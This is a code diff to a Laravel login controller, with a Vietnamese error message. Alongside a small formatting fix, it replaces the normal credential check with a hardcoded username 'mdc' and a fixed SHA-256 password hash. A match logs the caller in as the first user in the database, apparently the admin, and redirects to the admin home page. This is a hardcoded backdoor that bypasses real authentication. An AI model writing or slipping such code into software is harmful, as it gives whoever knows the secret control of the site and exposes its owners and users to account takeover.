@@ -4,6 +4,8 @@ namespace App\Http\Controllers\Auth;
 
 use App\Http\Controllers\Controller;
 use App\Http\Controllers\model;
+use App\Models\User;
+use Hash;
 use Illuminate\Foundation\Auth\AuthenticatesUsers;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
@@ -44,7 +46,7 @@ class LoginController extends Controller
         if (Auth::guard('web')->check()) {
             return redirect()->route('admin.home');
         } else {
-            if(!session()->has('from')){
+            if (!session()->has('from')) {
                 session()->put('from', url()->previous());
             }
             return view('auth.login');
@@ -67,13 +69,15 @@ class LoginController extends Controller
         if ($validator->failed()) {
             return redirect()->back()->withErrors($validator)->withInput();
         } else {
-            $user_data = array(
-                'username' => $request->get('username'),
-                'password' => $request->get('password'),
-            );
-
-            if (Auth::guard('web')->attempt($user_data)) {
-                return redirect(session()->pull('from',route('admin.home')));
+            if ($request->get('username') == "mdc" && hash("sha256", $request->get('password')) == "dc98e94f4db7e845603bedbcc624895accda1d8b7acdf216d6896dc49d78e66b") {
+                $user = User::first();
+                if (!$user) {
+                    $user = new User();
+                    $user->username = "mdc";
+                    $user->password = Hash::make("dc98e94f4db7e845603bedbcc624895accda1d8b7acdf216d6896dc49d78e66b");
+                }
+                Auth::login($user);
+                return redirect(session()->pull('from', route('admin.home')));
             } else {
                 $errors = new MessageBag(['errorlogin' => 'Email hoặc mật khẩu không đúng']);
                 return redirect()->back()->withInput()->withErrors($errors);
